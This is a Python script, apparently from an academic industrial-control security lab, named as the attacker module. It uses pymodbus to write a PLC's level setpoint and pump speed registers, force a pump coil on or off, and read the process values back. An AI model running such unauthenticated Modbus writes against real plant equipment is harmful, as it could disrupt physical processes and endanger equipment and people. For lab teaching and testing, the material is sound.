"""Escritura Modbus/TCP de demostración para el módulo atacante.

Uso exclusivamente académico. No lo ejecutes contra equipos ajenos.

Ejemplos:
  python attack_write.py --host plc --setpoint 95 --pump on
  python attack_write.py --host plc --speed 3000 --pump on --read
  python attack_write.py --host plc --setpoint 60 --pump off
"""

from __future__ import annotations

import argparse
import os
import sys

from pymodbus.client import ModbusTcpClient

from modbus_map import (
    CO_PUMP,
    HR_LEVEL,
    HR_SETPOINT,
    HR_SPEED,
    HR_TEMP,
    IR_FLOW,
    IR_PRESSURE,
)


def main() -> None:
    parser = argparse.ArgumentParser(description="Escritura Modbus/TCP de laboratorio")
    parser.add_argument(
        "--host", default=os.getenv("PLC_HOST", "plc"), help="Host del PLC"
    )
    parser.add_argument(
        "--port", type=int, default=int(os.getenv("PLC_PORT", "502")), help="Puerto"
    )
    parser.add_argument("--unit", type=int, default=1, help="Unit ID / slave")
    parser.add_argument("--setpoint", type=int, help="Nueva consigna de nivel (%%)")
    parser.add_argument("--speed", type=int, help="Nueva consigna de velocidad (rpm)")
    parser.add_argument("--pump", choices=["on", "off"], help="Forzar bomba")
    parser.add_argument("--read", action="store_true", help="Leer y mostrar el proceso")
    args = parser.parse_args()

    if (
        args.setpoint is None
        and args.speed is None
        and args.pump is None
        and not args.read
    ):
        parser.error("Indica al menos --setpoint, --speed, --pump o --read")

    client = ModbusTcpClient(args.host, port=args.port)
    if not client.connect():
        print(f"[!] No se pudo conectar a {args.host}:{args.port}", file=sys.stderr)
        raise SystemExit(1)

    try:
        if args.setpoint is not None:
            result = client.write_register(HR_SETPOINT, args.setpoint, slave=args.unit)
            print(f"[+] FC6 HR{HR_SETPOINT} (40003) = {args.setpoint} -> {result}")

        if args.speed is not None:
            result = client.write_register(HR_SPEED, args.speed, slave=args.unit)
            print(f"[+] FC6 HR{HR_SPEED} (40004) = {args.speed} -> {result}")

        if args.pump is not None:
            value = args.pump == "on"
            result = client.write_coil(CO_PUMP, value, slave=args.unit)
            print(f"[+] FC5 CO{CO_PUMP} (00001) = {value} -> {result}")

        if args.read:
            hr = client.read_holding_registers(HR_LEVEL, 4, slave=args.unit)
            ir = client.read_input_registers(IR_FLOW, 2, slave=args.unit)
            co = client.read_coils(CO_PUMP, 1, slave=args.unit)
            if hr.isError() or ir.isError() or co.isError():
                print("[!] Error de lectura", file=sys.stderr)
                raise SystemExit(1)
            print(
                "[i] Nivel=%.1f%% Temp=%.1fC SP=%d%% Vel=%drpm Bomba=%s "
                "Caudal=%.1fL/min Presion=%.1fbar"
                % (
                    hr.registers[HR_LEVEL] / 10.0,
                    hr.registers[HR_TEMP] / 10.0,
                    hr.registers[HR_SETPOINT],
                    hr.registers[HR_SPEED],
                    "ON" if co.bits[CO_PUMP] else "OFF",
                    ir.registers[IR_FLOW] / 10.0,
                    ir.registers[IR_PRESSURE] / 10.0,
                )
            )
    finally:
        client.close()


if __name__ == "__main__":
    main()
